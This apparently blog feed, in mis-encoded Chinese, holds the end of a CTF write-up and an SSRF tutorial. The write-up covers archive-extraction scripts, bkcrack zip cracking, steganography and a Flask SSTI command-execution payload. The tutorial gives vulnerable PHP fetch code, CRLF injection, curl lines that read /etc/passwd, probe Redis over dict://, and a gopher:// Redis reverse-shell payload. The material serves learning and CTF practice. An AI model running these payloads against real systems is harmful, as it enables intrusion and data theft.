        if os.path.isdir(extracted_file_path):
            continue

        if extracted_file.endswith((&#x27;.zip&#x27;, &#x27;.tar&#x27;, &#x27;.7z&#x27;)):
            handle_compressed_file(extracted_file_path, extract_dir, output_txt)
            if extracted_file.endswith(&#x27;.zip&#x27;):
                process_zip(extracted_file_path, extract_dir, output_txt)
            elif extracted_file.endswith(&#x27;.tar&#x27;):
                process_tar(extracted_file_path, extract_dir, output_txt)
            elif extracted_file.endswith(&#x27;.7z&#x27;):
                process_7z(extracted_file_path, extract_dir, output_txt)

    # åˆ é™¤å½“å‰å¤„ç†çš„å‹ç¼©åŒ…
    if tar_path.endswith(&#x27;.tar&#x27;):
        os.remove(tar_path)


def process_7z(archive_path, extract_dir, output_txt):
    &quot;&quot;&quot;å¤„ç†7zæ–‡ä»¶å¹¶é€’å½’è§£å‹å…¶ä¸­çš„å‹ç¼©åŒ…&quot;&quot;&quot;
    extracted_files = extract_7z(archive_path, extract_dir)
    for extracted_file in extracted_files:
        extracted_file_path = os.path.join(extract_dir, extracted_file)

        if os.path.isdir(extracted_file_path):
            continue

        if extracted_file.endswith((&#x27;.zip&#x27;, &#x27;.tar&#x27;, &#x27;.7z&#x27;)):
            handle_compressed_file(extracted_file_path, extract_dir, output_txt)
            if extracted_file.endswith(&#x27;.zip&#x27;):
                process_zip(extracted_file_path, extract_dir, output_txt)
            elif extracted_file.endswith(&#x27;.tar&#x27;):
                process_tar(extracted_file_path, extract_dir, output_txt)
            elif extracted_file.endswith(&#x27;.7z&#x27;):
                process_7z(extracted_file_path, extract_dir, output_txt)

    # åˆ é™¤å½“å‰å¤„ç†çš„å‹ç¼©åŒ…
    if archive_path.endswith(&#x27;.7z&#x27;):
        os.remove(archive_path)


def main():
    zip_path = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\1.zip&#x27;
    extract_dir = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\extracted&#x27;
    output_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output.txt&#x27;

    if not os.path.exists(extract_dir):
        os.makedirs(extract_dir)

    # å¼€å§‹å¤„ç†å‹ç¼©åŒ…
    with open(output_txt, &#x27;w&#x27;) as output_file:
        output_file.write(&quot;&quot;)
    process_zip(zip_path, extract_dir, output_txt)


if __name__ == &quot;__main__&quot;:
    main()</code></pre>

<p>å†å¯¹æå‡ºæ¥çš„æ–‡ä»¶ååšä¸¤ç§å¤„ç†</p>
<pre><code class="highlight plaintext">def reverse_file_names(input_txt, output_txt):
    &quot;&quot;&quot;è¯»å–æ–‡ä»¶åå¹¶å°†å…¶ä»åå¾€å‰è¿æ¥&quot;&quot;&quot;
    with open(input_txt, &#x27;r&#x27;) as infile:
        file_names = infile.readlines()

    # å»æ‰æ¢è¡Œç¬¦å¹¶ä»åå¾€å‰è¿æ¥
    reversed_file_names = [name.strip() for name in reversed(file_names)]

    # å°†è¿æ¥åçš„æ–‡ä»¶åå†™å…¥æ–°æ–‡ä»¶
    with open(output_txt, &#x27;w&#x27;) as outfile:
        outfile.write(&quot;è¿æ¥åçš„æ–‡ä»¶åï¼ˆä»åå¾€å‰ï¼‰ï¼š\n&quot;)
        outfile.write(&quot;&quot;.join(reversed_file_names))  # ä½¿ç”¨ç©ºæ ¼è¿æ¥æ–‡ä»¶å
def remove_newlines_and_connect(input_txt, output_txt):
    &quot;&quot;&quot;è¯»å–æ–‡ä»¶åå¹¶å»æ‰æ¢è¡Œç¬¦ï¼Œè¿æ¥æ‰€æœ‰æ–‡ä»¶å&quot;&quot;&quot;
    with open(input_txt, &#x27;r&#x27;) as infile:
        # è¯»å–æ‰€æœ‰è¡Œå¹¶å»æ‰æ¢è¡Œç¬¦
        file_names = infile.read().splitlines()

    # å°†æ–‡ä»¶åç”¨ç©ºæ ¼è¿æ¥
    connected_file_names = &quot;&quot;.join(file_names)

    # å°†è¿æ¥åçš„æ–‡ä»¶åå†™å…¥æ–°æ–‡ä»¶
    with open(output_txt, &#x27;w&#x27;) as outfile:
        outfile.write(&quot;è¿æ¥åçš„æ–‡ä»¶åï¼ˆå»æ‰æ¢è¡Œç¬¦ï¼‰ï¼š\n&quot;)
        outfile.write(connected_file_names)  # ç›´æ¥å†™å…¥è¿æ¥åçš„å­—ç¬¦ä¸²

def main():
    input_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output.txt&#x27;
    output1_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output_reversed.txt&#x27;
    output2_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output_simple.txt&#x27;
    reverse_file_names(input_txt, output1_txt)
    remove_newlines_and_connect(input_txt, output2_txt)

if __name__ == &quot;__main__&quot;:
    main()</code></pre>

<p>æ ¹æ®æç¤ºBASE58-Rippleã€SM4-ECB</p>
<p>å…ˆåå°è¯•é¡ºåºçš„å’Œé€†åºçš„</p>
<p>æœ€åé€†åºçš„å¾—åˆ°ä»¥ä¸‹</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119165516321.png" alt="image-20250119165516321"></p>
<p>çœ‹ä¸€çœ¼æ˜¯pngçš„æ–‡ä»¶å¤´ï¼Œåœ¨010ä»¥16è¿›åˆ¶ç²˜è´´å¾—åˆ°ä¸€å¼ å›¾ç‰‡</p>
<p><img src="/2025/01/21/2025%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/Users/ayano/Desktop/flag2.png" alt="flag"></p>
<p>åœ¨è°·æ­Œæœå›¾ååˆ¤æ–­å‡ºæ˜¯ DataMatrixç </p>
<p>åœ¨çº¿å·¥å…·è§£å†³ <img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119170503355.png" alt="image-20250119170503355"></p>
<h2 id="éŸ³é¢‘çš„ç§˜å¯†"><a href="#éŸ³é¢‘çš„ç§˜å¯†" class="headerlink" title="éŸ³é¢‘çš„ç§˜å¯†"></a>éŸ³é¢‘çš„ç§˜å¯†</h2><p>è§£å‹å¾—åˆ°ä¸€ä¸ªwavæ–‡ä»¶</p>
<p>æ ¹æ®æç¤ºdeepsoundå’Œå¼±å£ä»¤</p>
<p>è¯•ä¸€ä¸‹123ï¼Ÿ</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119181253709.png" alt="image-20250119181253709"></p>
<p>è¿æ°”æ¯”è¾ƒå¥½ç›´æ¥å‡ºæ¥äº†</p>
<p>æå–zipåå‘ç°éœ€è¦å¯†ç æ‰“å¼€</p>
<p>åœ¨010æŸ¥è¿‡ä¹‹åå‘ç°æ˜¯çœŸåŠ å¯†<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119181451213.png" alt="image-20250119181451213"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119181524239.png" alt="image-20250119181524239"></p>
<p>æ²¡æœ‰æç¤ºï¼Œç›´æ¥å°è¯•æ˜æ–‡çˆ†ç ´ï¼Œå·²çŸ¥pngæ–‡ä»¶å¤´ï¼Œä»¥è¿™ä¸ªä¸ºæ˜æ–‡å¼€å§‹çˆ†</p>
<pre><code class="highlight bash"><span class="built_in">echo</span> 89504E470D0A1A0A0000000D49484452 | xxd -r -ps &gt; png_header
bkcrack -C flag.zip -c flag.png -p png_header -o 0</code></pre>

<p>ç„¶åå¾—åˆ°å¯†é’¥ <code>29d29517 0fa535a9 abc67696</code></p>
<pre><code class="highlight bash">bkcrack -C flag.zip -c flag.png -k 29d29517 0fa535a9 abc67696 -d flag.png</code></pre>

<p>å¾—åˆ°flag.png</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/flag.png" alt="flag">é€šè¿‡stegsolveçœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰lsbéšå†™</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/893940eded9dc333fe7e104a38fccaf5.png" alt="893940eded9dc333fe7e104a38fccaf5"></p>
<p>å·¦ä¸Šè§’ä¸€çœ‹è‚¯å®šæœ‰lsbç¨³äº†ï¼Œzstegä¸€è·‘</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119203932034.png" alt="image-20250119203932034"></p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h2><p>æ ¹æ®æç¤ºæƒ³æƒ³flask,åº”è¯¥æ˜¯SSTIæ¼æ´</p>
<p>å…ˆè¯•ç€æ‰“ä¸€ä¸‹ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰ç»•è¿‡</p>
<pre><code class="highlight plaintext">&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117162602849.png" alt="image-20250117162602849"></p>
<p>ç›´æ¥çˆ†äº†ï¼Œé‚£å°±lsæ¢cat flagè§£å†³</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117162704054.png" alt="image-20250117162704054"></p>
]]></content>
      <tags>
        <tag>-CTF -misc -WP</tag>
      </tags>
  </entry>
  <entry>
    <title>114514åˆ†é’Ÿèƒ½äº†è§£SSRFå—</title>
    <url>/2025/07/07/114514%E5%88%86%E9%92%9F%E8%83%BD%E4%BA%86%E8%A7%A3SSRF%E5%90%97/</url>
    <content><![CDATA[<h1 id="â™¿1919810åˆ†é’Ÿèƒ½äº†è§£SSRFå—â™¿"><a href="#â™¿1919810åˆ†é’Ÿèƒ½äº†è§£SSRFå—â™¿" class="headerlink" title="â™¿1919810åˆ†é’Ÿèƒ½äº†è§£SSRFå—â™¿"></a>â™¿1919810åˆ†é’Ÿèƒ½äº†è§£SSRFå—â™¿</h1><p>å†²åˆºâ™¿ï¼Œå†²åˆºâ™¿ï¼Œå†²â™¿</p>
<h2 id="SSRFæ˜¯æ‰«ç "><a href="#SSRFæ˜¯æ‰«ç " class="headerlink" title="SSRFæ˜¯æ‰«ç "></a>SSRFæ˜¯æ‰«ç </h2><p>SSRFï¼Œå…¨ç§°<strong>Server-Side Request Forgeryï¼ŒæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ </strong></p>
<p>å…³é”®è¯æ˜¯<code>ip</code></p>
<p>é€šè¿‡ç”¨æˆ·è¾“å…¥åŒ…å«URLçš„åŠŸèƒ½&#x2F;è¯·æ±‚å‚æ•°åŒ…å«å¤–éƒ¨èµ„æºåº”ç”¨æ¥è§¦å‘s</p>
<p>è¯´ç™½äº†å°±æ˜¯é€šè¿‡ä¸€äº›æ–¹å¼å·å·çš„æ‘¸è¿›å†…ç½‘è§†å¥¸</p>
<p>ç›®å‰æœ‰è®°è½½çš„ä¸»æµçš„åœ¨PHP</p>
<p>è¯´å®è¯å…¶å®åªè¦æ¶‰åŠå¯¹å†…ç½‘çš„æ–‡ä»¶æœ‰è¯»å–(ä»è‡ªèº«å‘èµ·è¯·æ±‚)ï¼Œè¿‡æ»¤åˆä¸å……åˆ†çš„éƒ½ä¼šè§¦å‘è¿™ä¸ªæ¼æ´çš„</p>
<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><pre><code class="highlight php"><span class="title function_ invoke__">file_get_contents</span>()
<span class="title function_ invoke__">fsockopen</span>()
<span class="title function_ invoke__">curl_exec</span>()
<span class="title function_ invoke__">fopen</span>()
<span class="title function_ invoke__">readfile</span>()</code></pre>

<p>å…ˆè®²ç¬¬ä¸€ä¸ª</p>
<ul>
<li><code>file_get_contents()</code></li>
</ul>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];;
<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);
<span class="meta">?&gt;</span></code></pre>

<p>ä»urlè¿™ä¸ªå‚æ•°é‡Œè·å–å†…å®¹ï¼Œå¹¶æŒ‡å®šä¸€ä¸ªæ–‡ä»¶åè¿›è¡Œä¿å­˜</p>
<p>è€Œ<code>file_put_contents</code>æ˜¯æŠŠå­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶å½“ä¸­</p>
<ul>
<li><code>fsockopen()</code></li>
</ul>
<pre><code class="highlight php"><span class="meta">&lt;?php</span> 
<span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span></span>) </span>&#123; 
    <span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>); 
    <span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123; 
        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$errno</span>) \n&quot;</span>; 
    &#125; <span class="keyword">else</span> &#123; 
        <span class="variable">$out</span> = <span class="string">&quot;GET <span class="subst">$link</span> HTTP/1.1\r\n&quot;</span>; 
        <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>; 
        <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>; 
        <span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>; 
        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>); 
        <span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; 
        <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123; 
            <span class="variable">$contents</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>); 
        &#125; 
        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>); 
        <span class="keyword">return</span> <span class="variable">$contents</span>; 
    &#125; 
&#125;
<span class="meta">?&gt;</span></code></pre>

<p><code>fsockopen</code>å‡½æ•°å®ç°å¯¹ç”¨æˆ·æŒ‡å®šurlæ•°æ®çš„è·å–ï¼Œè¯¥å‡½æ•°ä½¿ç”¨socketï¼ˆç«¯å£ï¼‰è·ŸæœåŠ¡å™¨å»ºç«‹tcpè¿æ¥ï¼Œä¼ è¾“æ•°æ®ã€‚å˜é‡hostä¸ºä¸»æœºåï¼Œportä¸ºç«¯å£ï¼Œerrstrè¡¨ç¤ºé”™è¯¯ä¿¡æ¯å°†ä»¥å­—ç¬¦ä¸²çš„ä¿¡æ¯è¿”å›ï¼Œ30ä¸ºæ—¶é™</p>
<ul>
<li><code>curl_exec()</code></li>
</ul>
<p>cURLè¿™æ˜¯å¦ä¸€ä¸ªéå¸¸å¸¸è§çš„å®ç°ï¼Œå®ƒé€šè¿‡ PHPè·å–æ•°æ®ã€‚æ–‡ä»¶&#x2F;æ•°æ®è¢«ä¸‹è½½å¹¶å­˜å‚¨åœ¨â€œcurledâ€æ–‡ä»¶å¤¹ä¸‹çš„ç£ç›˜ä¸­ï¼Œå¹¶é™„åŠ äº†ä¸€ä¸ªéšæœºæ•°å’Œâ€œ.txtâ€æ–‡ä»¶æ‰©å±•åã€‚</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span> 
<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;
    <span class="variable">$link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
    <span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();
    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);
    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);
    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);
    <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);
    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>);

    <span class="variable">$filename</span> = <span class="string">&#x27;./curled/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;.txt&#x27;</span>;
    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$result</span>); 
    <span class="keyword">echo</span> <span class="variable">$result</span>;
&#125;
<span class="meta">?&gt;</span></code></pre>

<p><code>curl_exec</code>å‡½æ•°ç”¨äºæ‰§è¡ŒæŒ‡å®šçš„cURLä¼šè¯</p>
<ul>
<li><code>fopen()</code></li>
<li><code>readfile()</code></li>
</ul>
<blockquote>
<p>[!CAUTION]</p>
</blockquote>
<pre><code class="highlight plaintext">1.ä¸€èˆ¬æƒ…å†µä¸‹PHPä¸ä¼šå¼€å¯fopençš„gopher wrapper
2.file_get_contentsçš„gopheråè®®ä¸èƒ½URLç¼–ç 
3.file_get_contentså…³äºGopherçš„302è·³è½¬ä¼šå‡ºç°bugï¼Œå¯¼è‡´åˆ©ç”¨å¤±è´¥
4.curl/libcurl 7.43 ä¸Šgopheråè®®å­˜åœ¨bug(%00æˆªæ–­) ç»æµ‹è¯•7.49 å¯ç”¨
5.curl_exec() //é»˜è®¤ä¸è·Ÿè¸ªè·³è½¬ï¼Œ
6.file_get_contents() // file_get_contentsæ”¯æŒphp://inputåè®®</code></pre>

<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><p>å¯¹pythonçš„SSRFä¸å¤ªç†Ÿæ‚‰ï¼Œæ•…è¿™é‡Œå¼•ç”¨å¤§ä½¬çš„ä¸€äº›å†…å®¹</p>
<p>åœ¨Pythonä¸­ï¼Œå¸¸ç”¨çš„å‡½æ•°æœ‰urllib(urllib2)å’Œrequestsåº“ã€‚ä»¥urllib(urllib2)ä¸ºä¾‹ï¼Œ urllibå¹¶ä¸æ”¯æŒgopher,dictåè®®ï¼Œæ‰€ä»¥æŒ‰ç…§å¸¸ç†æ¥è®²ssrfåœ¨pythonä¸­çš„å±å®³ä¹Ÿåº”è¯¥ä¸å¤§ï¼Œä½†æ˜¯å½“SSRFé‡åˆ°CRLFï¼Œå¥‡å¦™çš„äº‹æƒ…å°±å‘ç”Ÿäº†ã€‚</p>
<p>urllibæ›¾çˆ†å‡ºCVE-2019-9740ã€CVE-2019-9947ä¸¤ä¸ªæ¼æ´ï¼Œè¿™ä¸¤ä¸ªæ¼æ´éƒ½æ˜¯urllib(urllib2)çš„CRLFæ¼æ´ï¼Œåªæ˜¯è§¦å‘ç‚¹ä¸ä¸€æ ·ï¼Œå…¶å½±å“èŒƒå›´éƒ½åœ¨urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through 3.7.3ä¹‹é—´ï¼Œç›®å‰å¤§éƒ¨åˆ†æœåŠ¡å™¨çš„python2ç‰ˆæœ¬éƒ½åœ¨2.7.10ä»¥ä¸‹ï¼Œpython3éƒ½åœ¨3.6.xï¼Œè¿™ä¸¤ä¸ªCRLFæ¼æ´çš„å½±å“åŠ›å°±éå¸¸å¯è§‚äº†ã€‚å…¶å®ä¹‹å‰è¿˜æœ‰ä¸€ä¸ªCVE-2016-5699ï¼ŒåŒæ ·çš„urllibï¼ˆurllib2ï¼‰çš„CRLFé—®é¢˜ï¼Œä½†æ˜¯ç”±äºæ—¶é—´æ¯”è¾ƒæ—©ï¼Œå½±å“èŒƒå›´æ²¡æœ‰è¿™ä¸¤ä¸ªå¤§ï¼Œè¿™é‡Œä¹Ÿä¸å†èµ˜å™</p>
<p>python2ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="highlight plaintext">import sysimport urllib2host = &quot;127.0.0.1:7777?a=1 HTTP/1.1\r\nCRLF-injection: test\r\nTEST: 123&quot;url = &quot;http://&quot;+ host + &quot;:8080/test/?test=a&quot;try:  info = urllib2.urlopen(url).info()  print(info)except Exception as e:print(e)</code></pre>

<h2 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><p>ä¸€èˆ¬åˆ©ç”¨éœ€è¦ä»¥ä¸‹åè®®</p>
<h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><p>æœ‰å›æ˜¾çš„æƒ…å†µä¸‹å¯ä»¥æ‰“ï¼Œè¯»å–ä»»æ„å†…å®¹</p>
<h3 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h3><p>æ³„éœ²å®‰è£…è½¯ä»¶ç‰ˆæœ¬ä¿¡æ¯ï¼ŒæŸ¥çœ‹ç«¯å£ï¼Œæ“ä½œå†…ç½‘redisæœåŠ¡ç­‰</p>
<pre><code class="highlight plaintext">http://test.org/ssrf.php?url=dict://127.0.0.1:6379/info  //æŸ¥çœ‹reidsç›¸å…³é…ç½®

å¦‚æœssrf.phpä¸­åŠ ä¸Šä¸€è¡Œå±è”½å›æ˜¾çš„ä»£ç â€œcurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);â€ï¼Œé‚£ä¹ˆè¿™ç§æ–¹å¼å°±å¤±æ•ˆäº†ï¼Œå’Œgopherä¸€æ ·ï¼Œåªèƒ½åˆ©ç”¨ncç›‘å¬ç«¯å£ï¼Œåå¼¹ä¼ è¾“æ•°æ®äº†ã€‚</code></pre>

<h3 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h3><p>gopheræ”¯æŒå‘å‡ºGETã€POSTè¯·æ±‚ï¼šå¯ä»¥å…ˆæˆªè·getè¯·æ±‚åŒ…å’Œpostè¯·æ±‚åŒ…ï¼Œå†æ„é€ æˆç¬¦åˆgopheråè®®çš„è¯·æ±‚ã€‚gopheråè®®æ˜¯ssrfåˆ©ç”¨ä¸­ä¸€ä¸ªæœ€å¼ºå¤§çš„åè®®(ä¿—ç§°ä¸‡èƒ½åè®®)ã€‚å¯ç”¨äºåå¼¹shell.</p>
<p>gopheråŒ…æ„é€ æ–¹æ³•</p>
<p><strong>GETåŒ…</strong></p>
<pre><code class="highlight plaintext">æˆªå–ç¬¬ä¸€è¡Œå’Œç¬¬äºŒè¡Œ(å…¨éƒ¨urlç¼–ç å¹¶ä¸”+_)
GET ......
Host ......</code></pre>

<p>å®ä¾‹:</p>
<pre><code class="highlight plaintext">GET /testg.php?name=xxx HTTP/1.1
Host: 10.211.55.2
å¯ä»¥æ„é€ ä¸º
_%47%45%54%20%2f%74%65%73%74%67%2e%70%68%70%3f%6e%61%6d%65%3d%78%78%78%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%32%31%31%2e%35%35%2e%32%0d%0a

ä¸€å®šè¦æ‰‹å·¥è¡¥ä¸Šæ¢è¡Œ%0d%0a</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250505140956343.png" alt="image-20250505140956343"></p>
<p><strong>POSTåŒ…</strong></p>
<pre><code class="highlight plaintext">æˆªå–ä»¥ä¸‹éƒ¨åˆ†
POST ....
Host ....
Content-Type: application/x-www-form-urlencoded
Content-Length: i</code></pre>



<h3 id="http-s"><a href="#http-s" class="headerlink" title="http&#x2F;s"></a>http&#x2F;s</h3><p>æ¢æµ‹å†…ç½‘ä¸»æœºå­˜æ´»</p>
<h3 id="æœ¬åœ°åˆ©ç”¨"><a href="#æœ¬åœ°åˆ©ç”¨" class="headerlink" title="æœ¬åœ°åˆ©ç”¨:"></a>æœ¬åœ°åˆ©ç”¨:</h3><p>ï¼ˆ1ï¼‰ä½¿ç”¨fileåè®® file protocol (ä»»æ„æ–‡ä»¶è¯»å–)</p>
<pre><code class="highlight plaintext">curl -vvv &quot;http://target/ssrf.php?url=file:///etc/passwd&quot;</code></pre>

<p>ï¼ˆ2ï¼‰ä½¿ç”¨dictåè®® dict protocol (è·å–Redisé…ç½®ä¿¡æ¯)</p>
<pre><code class="highlight plaintext">curl -vvv &quot;http://target/ssrf.php?url=dict://127.0.0.1:6379/info&quot;</code></pre>

<p>ï¼ˆ3ï¼‰ä½¿ç”¨gopheråè®®(ä¿—ç§°ä¸‡èƒ½åè®®) gopher protocol (ä¸€é”®åå¼¹Bash)</p>
<pre><code class="highlight plaintext">curl -vvv &quot;http://target/ssrf.php?url=gopher://127.0.0.1:6379/_*1 %0d %0a $8%0d %0aflushall %0d %0a*3 %0d %0a $3%0d</code></pre>

<h3 id="æ£€æµ‹ç«¯å£æƒ…å†µ"><a href="#æ£€æµ‹ç«¯å£æƒ…å†µ" class="headerlink" title="æ£€æµ‹ç«¯å£æƒ…å†µ"></a>æ£€æµ‹ç«¯å£æƒ…å†µ</h3><pre><code class="highlight plaintext">3306ï¼š MySQL
443ï¼štcp
8080ï¼šTCPæœåŠ¡ç«¯é»˜è®¤ç«¯å£ã€JBOSSã€TOMCATã€Oracle XDBï¼ˆXML æ•°æ®åº“ï¼‰
6379ï¼šRedisæ•°æ®åº“ç«¯å£</code></pre>



<h2 id="éªŒè¯"><a href="#éªŒè¯" class="headerlink" title="éªŒè¯"></a>éªŒè¯</h2><p>ä¸€èˆ¬URLä¸Šä¼šå‡ºç°å…³é”®å­—ç±»ä¼¼äº</p>
<pre><code class="highlight plaintext">Shareã€wapã€urlã€linkã€srcã€sourceã€targetã€uã€3gã€displayã€sourceURLã€imageURLã€domain</code></pre>

<h3 id="æ’é™¤æ³•"><a href="#æ’é™¤æ³•" class="headerlink" title="æ’é™¤æ³•"></a>æ’é™¤æ³•</h3><p>æµè§ˆå™¨f12æŸ¥çœ‹æºä»£ç çœ‹æ˜¯å¦æ˜¯åœ¨æœ¬åœ°è¿›è¡Œäº†è¯·æ±‚</p>
<p>æ¯”å¦‚ï¼šè¯¥èµ„æºåœ°å€ç±»å‹ä¸º <a href="http://www.xxx.com/a.php?image=URL,URL%E5%8F%82%E6%95%B0%E8%8B%A5%E6%98%AF%E5%85%B6%E4%BB%96%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9C%B0%E5%9D%80%E5%B0%B1%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E">http://www.xxx.com/a.php?image=URL,URLå‚æ•°è‹¥æ˜¯å…¶ä»–æœåŠ¡å™¨åœ°å€å°±å¯èƒ½å­˜åœ¨SSRFæ¼æ´</a></p>
<h3 id="dnslogç­‰å·¥å…·è¿›è¡Œæµ‹è¯•"><a href="#dnslogç­‰å·¥å…·è¿›è¡Œæµ‹è¯•" class="headerlink" title="dnslogç­‰å·¥å…·è¿›è¡Œæµ‹è¯•"></a>dnslogç­‰å·¥å…·è¿›è¡Œæµ‹è¯•</h3><p>çœ‹æ˜¯å¦è¢«è®¿é—®(å¯ä»¥åœ¨ç›²æ‰“åå°ï¼Œç”¨ä¾‹ä¸­å°†å½“å‰å‡†å¤‡è¯·æ±‚çš„urlå’Œå‚æ•°ç¼–ç æˆbase64ï¼Œè¿™æ ·ç›²æ‰“åå°è§£ç åå°±çŸ¥é“æ˜¯å“ªå°æœºå™¨å“ªä¸ªcgiè§¦å‘çš„è¯·æ±‚)</p>
<h3 id="åˆ†æè¯·æ±‚çš„å‘èµ·ç«¯"><a href="#åˆ†æè¯·æ±‚çš„å‘èµ·ç«¯" class="headerlink" title="åˆ†æè¯·æ±‚çš„å‘èµ·ç«¯"></a>åˆ†æè¯·æ±‚çš„å‘èµ·ç«¯</h3><p>æŠ“åŒ…åˆ†æå‘é€çš„è¯·æ±‚æ˜¯ä¸æ˜¯é€šè¿‡æœåŠ¡å™¨å‘é€çš„ï¼Œå¦‚æœä¸æ˜¯å®¢æˆ·ç«¯å‘å‡ºçš„è¯·æ±‚ï¼Œåˆ™æœ‰å¯èƒ½æ˜¯å­˜åœ¨æ¼æ´ã€‚æ¥ç€æ‰¾å­˜åœ¨HTTPæœåŠ¡çš„å†…ç½‘åœ°å€</p>
<ul>
<li>ä»æ¼æ´å¹³å°ä¸­çš„å†å²æ¼æ´å¯»æ‰¾æ³„æ¼çš„å­˜åœ¨webåº”ç”¨å†…ç½‘åœ°å€</li>
<li>é€šè¿‡äºŒçº§åŸŸåæš´åŠ›çŒœè§£å·¥å…·æ¨¡ç³ŠçŒœæµ‹å†…ç½‘åœ°å€</li>
<li>é€šè¿‡fileåè®®è¯»å–å†…ç½‘ä¿¡æ¯è·å–ç›¸å…³åœ°å€</li>
</ul>
<h3 id="ç•™æ„è¿”å›ä¿¡æ¯"><a href="#ç•™æ„è¿”å›ä¿¡æ¯" class="headerlink" title="ç•™æ„è¿”å›ä¿¡æ¯"></a>ç•™æ„è¿”å›ä¿¡æ¯</h3><p>ç›´æ¥è¿”å›çš„Bannerã€titleã€contentç­‰ä¿¡æ¯</p>
<h3 id="ç•™æ„å¸ƒå°”å‹SSRF"><a href="#ç•™æ„å¸ƒå°”å‹SSRF" class="headerlink" title="ç•™æ„å¸ƒå°”å‹SSRF"></a>ç•™æ„å¸ƒå°”å‹SSRF</h3><p>é€šè¿‡åˆ¤æ–­ä¸¤æ¬¡ä¸åŒè¯·æ±‚ç»“æœçš„å·®å¼‚æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨SSRFï¼Œç±»ä¼¼å¸ƒå°”å‹sqlç›²æ³¨æ–¹æ³•ã€‚</p>
